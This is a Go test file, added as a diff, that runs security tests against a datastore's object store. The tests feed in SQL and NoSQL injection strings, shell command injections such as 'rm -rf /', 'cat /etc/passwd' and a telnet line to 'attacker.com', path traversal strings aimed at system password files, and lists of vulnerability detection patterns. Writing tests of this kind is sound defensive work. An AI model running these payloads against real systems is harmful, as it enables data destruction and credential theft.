@@ -1,0 +1,596 @@
+package datastore
+
+import (
+	"bytes"
+	"context"
+	"fmt"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+)
+
+// SecurityTestSuite runs comprehensive security tests
+func SecurityTestSuite(t *testing.T, store DataStore) {
+	t.Run("InjectionAttacks", func(t *testing.T) {
+		runInjectionTests(t, store)
+	})
+	
+	t.Run("PathTraversalTests", func(t *testing.T) {
+		runPathTraversalTests(t, store)
+	})
+	
+	t.Run("AuthenticationBypass", func(t *testing.T) {
+		runAuthenticationBypassTests(t, store)
+	})
+	
+	t.Run("DataLeakageTests", func(t *testing.T) {
+		runDataLeakageTests(t, store)
+	})
+	
+	t.Run("TimingAttacks", func(t *testing.T) {
+		runTimingAttackTests(t, store)
+	})
+	
+	t.Run("MemoryDisclosureTests", func(t *testing.T) {
+		runMemoryDisclosureTests(t, store)
+	})
+}
+
+// runInjectionTests tests various injection attack vectors
+func runInjectionTests(t *testing.T, store DataStore) {
+	t.Run("SQLInjectionAttempts", func(t *testing.T) {
+		sqlInjectionPayloads := []string{
+			"'; DROP TABLE objects; --",
+			"' OR 1=1 --",
+			"'; INSERT INTO objects VALUES ('malicious', 'data'); --",
+			"' UNION SELECT * FROM users --",
+			"'; EXEC xp_cmdshell('dir'); --",
+			"admin'--",
+			"admin' #",
+			"admin'/*",
+			"' or 1=1#",
+			"' or 1=1--",
+			"' or 1=1/*",
+			") or '1'='1--",
+			") or ('1'='1--",
+		}
+		
+		for i, payload := range sqlInjectionPayloads {
+			t.Run(fmt.Sprintf("SQLPayload%d", i), func(t *testing.T) {
+				// Test payload as hash
+				hash := fmt.Sprintf("sql-injection-%d", i)
+				data := []byte(payload)
+				
+				err := store.ObjectStore().PutObject(hash, data)
+				// Should handle malicious data safely
+				if err == nil {
+					// If store accepts it, verify it's stored as literal data
+					retrieved, err := store.ObjectStore().GetObject(hash)
+					require.NoError(t, err)
+					assert.Equal(t, data, retrieved, "Payload should be stored as literal data")
+				}
+				
+				// Test payload as hash name itself
+				safeHash := "sql-test-" + strings.ReplaceAll(payload, "'", "")
+				safeHash = strings.ReplaceAll(safeHash, "-", "")
+				safeHash = strings.ReplaceAll(safeHash, " ", "")
+				if len(safeHash) > 100 {
+					safeHash = safeHash[:100]
+				}
+				
+				err = store.ObjectStore().PutObject(safeHash, []byte("test"))
+				// Store should handle this without executing SQL
+				t.Logf("SQL injection test %d result: %v", i, err)
+			})
+		}
+	})
+	
+	t.Run("NoSQLInjectionAttempts", func(t *testing.T) {
+		noSQLPayloads := []string{
+			`{"$ne": null}`,
+			`{"$gt": ""}`,
+			`{"$where": "function() { return true; }"}`,
+			`{"$regex": ".*"}`,
+			`"; return true; var foo = "`,
+			`') || 1==1 || ('`,
+			`' || 1==1 //`,
+			`{"$or": [{"a": 1}, {"b": 2}]}`,
+		}
+		
+		for i, payload := range noSQLPayloads {
+			hash := fmt.Sprintf("nosql-injection-%d", i)
+			data := []byte(payload)
+			
+			err := store.ObjectStore().PutObject(hash, data)
+			if err == nil {
+				retrieved, err := store.ObjectStore().GetObject(hash)
+				require.NoError(t, err)
+				assert.Equal(t, data, retrieved, "NoSQL payload should be stored as literal data")
+			}
+			
+			t.Logf("NoSQL injection test %d result: %v", i, err)
+		}
+	})
+	
+	t.Run("CommandInjectionAttempts", func(t *testing.T) {
+		commandPayloads := []string{
+			"; ls -la",
+			"& dir",
+			"| cat /etc/passwd",
+			"`whoami`",
+			"$(id)",
+			"; rm -rf /",
+			"&& echo 'pwned'",
+			"|| echo 'fallback'",
+			"\n/bin/sh\n",
+			"\r\ntelnet attacker.com\r\n",
+		}
+		
+		for i, payload := range commandPayloads {
+			hash := fmt.Sprintf("cmd-injection-%d", i)
+			data := []byte(payload)
+			
+			err := store.ObjectStore().PutObject(hash, data)
+			if err == nil {
+				retrieved, err := store.ObjectStore().GetObject(hash)
+				require.NoError(t, err)
+				assert.Equal(t, data, retrieved, "Command payload should be stored as literal data")
+			}
+			
+			t.Logf("Command injection test %d result: %v", i, err)
+		}
+	})
+}
+
+// runPathTraversalTests tests directory traversal attack vectors
+func runPathTraversalTests(t *testing.T, store DataStore) {
+	pathTraversalHashes := []string{
+		"../../../etc/passwd",
+		"..\\..\\..\\windows\\system32\\config\\sam",
+		"/etc/shadow",
+		"C:\\Windows\\System32\\drivers\\etc\\hosts",
+		"....//....//....//etc/passwd",
+		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
+		"..%252f..%252f..%252fetc%252fpasswd",      // Double URL encoded
+		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // Unicode encoded
+		"file:///etc/passwd",
+		"\\\\server\\share\\sensitive.txt",
+		"../../../../../../../../../../etc/passwd",
+		"dir/../dir/../dir/../etc/passwd",
+	}
+	
+	for i, hash := range pathTraversalHashes {
+		t.Run(fmt.Sprintf("PathTraversal%d", i), func(t *testing.T) {
+			data := []byte("sensitive data that should not be accessible")
+			
+			err := store.ObjectStore().PutObject(hash, data)
+			t.Logf("Path traversal attempt %d (%s): %v", i, hash, err)
+			
+			if err == nil {
+				// If store accepts it, verify it's isolated
+				retrieved, err := store.ObjectStore().GetObject(hash)
+				if err == nil {
+					assert.Equal(t, data, retrieved, "Data should be retrieved exactly as stored")
+					
+					// Verify it's not actually accessing system files
+					assert.Equal(t, data, retrieved, "Should not return system file contents")
+				}
+			}
+		})
+	}
+}
+
+// runAuthenticationBypassTests tests authentication bypass attempts
+func runAuthenticationBypassTests(t *testing.T, store DataStore) {
+	t.Run("PrivilegeEscalation", func(t *testing.T) {
+		// Test if we can access or modify system-level data
+		systemHashes := []string{
+			"admin",
+			"root",
+			"system",
+			"SYSTEM",
+			"Administrator",
+			".admin",
+			"admin.",
+			"_admin",
+			"admin_",
+			"config",
+			"settings",
+			"password",
+			"secret",
+			"key",
+		}
+		
+		for _, hash := range systemHashes {
+			// Try to store sensitive-looking data
+			sensitiveData := []byte("admin:password:root:secret")
+			
+			err := store.ObjectStore().PutObject(hash, sensitiveData)
+			t.Logf("System hash access attempt (%s): %v", hash, err)
+			
+			if err == nil {
+				// Verify it's stored properly and not interpreted as system data
+				retrieved, err := store.ObjectStore().GetObject(hash)
+				if err == nil {
+					assert.Equal(t, sensitiveData, retrieved)
+				}
+			}
+		}
+	})
+	
+	t.Run("MetadataAccess", func(t *testing.T) {
+		// Try to access potential metadata or system information
+		metadataHashes := []string{
+			"_metadata",
+			"__meta__",
+			".config",
+			".settings",
+			"schema",
+			"version",
+			"info",
+			"status",
+			"health",
+			"stats",
+		}
+		
+		for _, hash := range metadataHashes {
+			// First store something
+			testData := []byte("test metadata")
+			err := store.ObjectStore().PutObject(hash, testData)
+			t.Logf("Metadata access attempt (%s): %v", hash, err)
+			
+			if err == nil {
+				retrieved, err := store.ObjectStore().GetObject(hash)
+				if err == nil {
+					// Should get back what we stored, not system metadata
+					assert.Equal(t, testData, retrieved, 
+						"Should return stored data, not system metadata")
+				}
+			}
+		}
+	})
+}
+
+// runDataLeakageTests tests for information disclosure vulnerabilities
+func runDataLeakageTests(t *testing.T, store DataStore) {
+	t.Run("ErrorMessageLeakage", func(t *testing.T) {
+		// Try operations that should fail and examine error messages
+		testCases := []struct {
+			name      string
+			operation func() error
+		}{
+			{
+				name: "NonExistentObject",
+				operation: func() error {
+					_, err := store.ObjectStore().GetObject("definitely-does-not-exist-12345")
+					return err
+				},
+			},
+			{
+				name: "InvalidHash",
+				operation: func() error {
+					_, err := store.ObjectStore().GetObject("")
+					return err
+				},
+			},
+			{
+				name: "DeleteNonExistent",
+				operation: func() error {
+					return store.ObjectStore().DeleteObject("non-existent-to-delete")
+				},
+			},
+		}
+		
+		for _, tc := range testCases {
+			err := tc.operation()
+			if err != nil {
+				errMsg := err.Error()
+				
+				// Check for potential information leakage in error messages
+				sensitivePatterns := []string{
+					"/tmp/", "/var/", "/home/",      // File paths
+					"C:\\", "D:\\",                  // Windows paths
+					"localhost", "127.0.0.1",       // Network info
+					"password", "secret", "key",     // Credentials
+					"database", "table", "column",   // Database internals
+					"SELECT", "INSERT", "UPDATE",    // SQL queries
+				}
+				
+				for _, pattern := range sensitivePatterns {
+					if strings.Contains(strings.ToLower(errMsg), strings.ToLower(pattern)) {
+						t.Logf("POTENTIAL INFO LEAK in %s error: %s (contains %s)", 
+							tc.name, errMsg, pattern)
+					}
+				}
+				
+				t.Logf("%s error (safe): %s", tc.name, errMsg)
+			}
+		}
+	})
+	
+	t.Run("DataCrossContamination", func(t *testing.T) {
+		// Test if data from one operation can leak into another
+		
+		// Store sensitive data
+		sensitiveHash := "sensitive-data-test"
+		sensitiveData := []byte("CONFIDENTIAL: This is sensitive information")
+		
+		err := store.ObjectStore().PutObject(sensitiveHash, sensitiveData)
+		require.NoError(t, err)
+		
+		// Store normal data
+		normalHash := "normal-data-test"
+		normalData := []byte("This is normal public data")
+		
+		err = store.ObjectStore().PutObject(normalHash, normalData)
+		require.NoError(t, err)
+		
+		// Retrieve normal data multiple times
+		for i := 0; i < 10; i++ {
+			retrieved, err := store.ObjectStore().GetObject(normalHash)
+			require.NoError(t, err)
+			
+			// Should never contain sensitive data
+			assert.Equal(t, normalData, retrieved)
+			assert.NotContains(t, string(retrieved), "CONFIDENTIAL", 
+				"Normal data should not contain sensitive information")
+		}
+		
+		// Try to trigger potential buffer reuse issues
+		largeData := make([]byte, len(sensitiveData)+1000)
+		copy(largeData, sensitiveData)
+		copy(largeData[len(sensitiveData):], normalData)
+		
+		bufferTestHash := "buffer-test"
+		err = store.ObjectStore().PutObject(bufferTestHash, normalData)
+		require.NoError(t, err)
+		
+		retrieved, err := store.ObjectStore().GetObject(bufferTestHash)
+		require.NoError(t, err)
+		assert.Equal(t, normalData, retrieved)
+	})
+}
+
+// runTimingAttackTests tests for timing-based vulnerabilities
+func runTimingAttackTests(t *testing.T, store DataStore) {
+	t.Run("ObjectExistenceTimingAttack", func(t *testing.T) {
+		// Test if object existence can be determined by timing
+		
+		// Create a known object
+		knownHash := "known-object-for-timing"
+		err := store.ObjectStore().PutObject(knownHash, []byte("known data"))
+		require.NoError(t, err)
+		
+		measurements := make(map[string][]time.Duration)
+		iterations := 50
+		
+		// Measure timing for existing object
+		for i := 0; i < iterations; i++ {
+			start := time.Now()
+			_, err := store.ObjectStore().GetObject(knownHash)
+			duration := time.Since(start)
+			
+			if err == nil {
+				measurements["existing"] = append(measurements["existing"], duration)
+			}
+		}
+		
+		// Measure timing for non-existing object
+		for i := 0; i < iterations; i++ {
+			nonExistentHash := fmt.Sprintf("non-existent-%d", i)
+			start := time.Now()
+			_, err := store.ObjectStore().GetObject(nonExistentHash)
+			duration := time.Since(start)
+			
+			if err != nil {
+				measurements["non-existing"] = append(measurements["non-existing"], duration)
+			}
+		}
+		
+		// Calculate averages
+		var existingAvg, nonExistingAvg time.Duration
+		
+		if len(measurements["existing"]) > 0 {
+			var total time.Duration
+			for _, d := range measurements["existing"] {
+				total += d
+			}
+			existingAvg = total / time.Duration(len(measurements["existing"]))
+		}
+		
+		if len(measurements["non-existing"]) > 0 {
+			var total time.Duration
+			for _, d := range measurements["non-existing"] {
+				total += d
+			}
+			nonExistingAvg = total / time.Duration(len(measurements["non-existing"]))
+		}
+		
+		t.Logf("Timing analysis:")
+		t.Logf("  Existing object average: %v", existingAvg)
+		t.Logf("  Non-existing object average: %v", nonExistingAvg)
+		
+		// Large timing differences could indicate a vulnerability
+		if existingAvg > 0 && nonExistingAvg > 0 {
+			ratio := float64(existingAvg) / float64(nonExistingAvg)
+			if ratio > 2.0 || ratio < 0.5 {
+				t.Logf("POTENTIAL TIMING ATTACK VECTOR: significant timing difference (ratio: %.2f)", ratio)
+			}
+		}
+	})
+	
+	t.Run("AuthenticationTimingAttack", func(t *testing.T) {
+		// Simulate authentication timing attack
+		// This mainly applies to stores with built-in authentication
+		
+		correctCreds := []byte("correct-credentials")
+		incorrectCreds := []byte("incorrect-credentials")
+		
+		// Store an object that simulates authenticated access
+		authHash := "authenticated-object"
+		err := store.ObjectStore().PutObject(authHash, correctCreds)
+		require.NoError(t, err)
+		
+		// Measure timing for various authentication attempts
+		timingData := make(map[string][]time.Duration)
+		
+		testCases := []struct {
+			name string
+			data []byte
+		}{
+			{"correct", correctCreds},
+			{"incorrect", incorrectCreds},
+			{"empty", []byte("")},
+			{"long-incorrect", bytes.Repeat([]byte("x"), len(correctCreds)*2)},
+		}
+		
+		for _, tc := range testCases {
+			for i := 0; i < 20; i++ {
+				testHash := fmt.Sprintf("auth-test-%s-%d", tc.name, i)
+				
+				start := time.Now()
+				err := store.ObjectStore().PutObject(testHash, tc.data)
+				duration := time.Since(start)
+				
+				timingData[tc.name] = append(timingData[tc.name], duration)
+				
+				if err != nil {
+					t.Logf("Auth test %s failed: %v", tc.name, err)
+				}
+			}
+		}
+		
+		// Analyze timing patterns
+		for name, durations := range timingData {
+			if len(durations) > 0 {
+				var total time.Duration
+				for _, d := range durations {
+					total += d
+				}
+				avg := total / time.Duration(len(durations))
+				t.Logf("Auth timing %s: average %v", name, avg)
+			}
+		}
+	})
+}
+
+// runMemoryDisclosureTests tests for memory disclosure vulnerabilities
+func runMemoryDisclosureTests(t *testing.T, store DataStore) {
+	t.Run("UninitializedMemoryAccess", func(t *testing.T) {
+		// Test if uninitialized memory can be accessed
+		
+		// Store data with specific patterns
+		patterns := [][]byte{
+			bytes.Repeat([]byte{0xAA}, 1000),
+			bytes.Repeat([]byte{0x55}, 1000),
+			bytes.Repeat([]byte{0xFF}, 1000),
+			bytes.Repeat([]byte{0x00}, 1000),
+		}
+		
+		for i, pattern := range patterns {
+			hash := fmt.Sprintf("memory-pattern-%d", i)
+			err := store.ObjectStore().PutObject(hash, pattern)
+			require.NoError(t, err)
+		}
+		
+		// Try to retrieve with different sizes to detect buffer issues
+		for i, pattern := range patterns {
+			hash := fmt.Sprintf("memory-pattern-%d", i)
+			retrieved, err := store.ObjectStore().GetObject(hash)
+			require.NoError(t, err)
+			
+			// Should get exact data back
+			assert.Equal(t, pattern, retrieved)
+			
+			// Check for any extra data that might indicate memory disclosure
+			assert.Equal(t, len(pattern), len(retrieved), 
+				"Retrieved data should be exact length")
+		}
+	})
+	
+	t.Run("BufferOverreadDetection", func(t *testing.T) {
+		// Test for potential buffer overreads
+		
+		shortData := []byte("short")
+		longData := bytes.Repeat([]byte("SENSITIVE"), 1000)
+		
+		// Store long data first
+		err := store.ObjectStore().PutObject("long-data", longData)
+		require.NoError(t, err)
+		
+		// Store short data (might reuse buffer)
+		err = store.ObjectStore().PutObject("short-data", shortData)
+		require.NoError(t, err)
+		
+		// Retrieve short data
+		retrieved, err := store.ObjectStore().GetObject("short-data")
+		require.NoError(t, err)
+		
+		// Should only get short data, not remnants of long data
+		assert.Equal(t, shortData, retrieved)
+		assert.NotContains(t, string(retrieved), "SENSITIVE", 
+			"Short data should not contain remnants of long data")
+	})
+	
+	t.Run("TransactionMemoryIsolation", func(t *testing.T) {
+		// Test memory isolation in transactions
+		
+		ctx := context.Background()
+		
+		// Start first transaction
+		tx1, err := store.BeginTx(ctx, nil)
+		if err != nil {
+			t.Skip("Store doesn't support transactions")
+		}
+		
+		secretData := []byte("SECRET: This should not leak between transactions")
+		err = tx1.PutObject("tx1-secret", secretData)
+		require.NoError(t, err)
+		
+		// Start second transaction
+		tx2, err := store.BeginTx(ctx, nil)
+		require.NoError(t, err)
+		
+		normalData := []byte("normal data")
+		err = tx2.PutObject("tx2-normal", normalData)
+		require.NoError(t, err)
+		
+		// Retrieve from second transaction
+		retrieved, err := tx2.GetObject("tx2-normal")
+		require.NoError(t, err)
+		
+		// Should not contain secret data from first transaction
+		assert.Equal(t, normalData, retrieved)
+		assert.NotContains(t, string(retrieved), "SECRET", 
+			"Transaction data should be isolated")
+		
+		// Clean up
+		tx1.Rollback()
+		tx2.Rollback()
+	})
+}
+
+// Helper function to check for common vulnerability patterns
+func checkForVulnerabilityPatterns(t *testing.T, data []byte, context string) {
+	dataStr := string(data)
+	
+	vulnerabilityPatterns := map[string][]string{
+		"Path Disclosure": {"/home/", "/etc/", "/var/", "/tmp/", "C:\\Users\\", "C:\\Windows\\"},
+		"SQL Injection":   {"SELECT ", "INSERT ", "UPDATE ", "DELETE ", "DROP "},
+		"Command Injection": {"bash", "cmd.exe", "powershell", "/bin/sh"},
+		"Credentials":     {"password=", "pwd=", "pass=", "secret=", "key="},
+		"System Info":     {"127.0.0.1", "localhost", "root:", "admin:"},
+	}
+	
+	for category, patterns := range vulnerabilityPatterns {
+		for _, pattern := range patterns {
+			if strings.Contains(strings.ToLower(dataStr), strings.ToLower(pattern)) {
+				t.Logf("POTENTIAL VULNERABILITY in %s: found %s pattern '%s'", 
+					context, category, pattern)
+			}
+		}
+	}
+}
